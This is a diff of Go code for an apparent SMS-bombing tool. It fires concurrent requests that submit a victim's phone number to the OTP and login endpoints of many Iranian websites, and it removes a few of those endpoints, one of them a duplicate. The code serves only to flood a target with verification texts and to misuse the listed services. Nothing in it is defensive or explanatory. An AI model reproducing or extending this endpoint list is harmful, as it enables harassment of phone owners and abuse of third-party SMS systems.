@@ -129,9 +129,6 @@ func main() {
 		go sms("https://api.torob.com/v4/user/phone/send-pin/?phone_number=phone&source=next_desktop", map[string]interface{}{
 			"phone_number": phone,
 		}, ch)   // add site   moshkel dareh❌❌❌ hamchenin in site neshan.org & technolife.com
-		go sms("https://api.torobpay.com/user/v1/login/", map[string]interface{}{
-			"phone_number": phone,
-		}, ch)   // add site
  		go sms("https://app.ezpay.ir:8443/open/v1/user/validation-code", map[string]interface{}{
 			"phoneNumber": phone,
 		}, ch)  // add site
@@ -227,9 +224,6 @@ func main() {
 		}, ch)   // add site
 		go sms("https://api.ostadkr.com/login", map[string]interface{}{
 			"mobile": phone,
-		}, ch)   // add site
-		go sms("https://www.miare.ir/api/otp/driver/request/", map[string]interface{}{
-			"phone_number": phone,
 		}, ch)   // add site
 		go sms("https://drdr.ir/api/v3/auth/login/mobile/init", map[string]interface{}{
 			"mobile": phone,
@@ -510,9 +504,6 @@ func main() {
 		}, ch)
 		go sms("https://mazoocandle.ir/login", map[string]interface{}{
 			"phone": phone,
-		}, ch)
-		go sms("https://api.ostadkr.com/login", map[string]interface{}{
-			"mobile": phone,
 		}, ch)
 		go sms("https://api.paymishe.com/api/v1/otp/registerOrLogin", map[string]interface{}{
 			"mobile": phone,
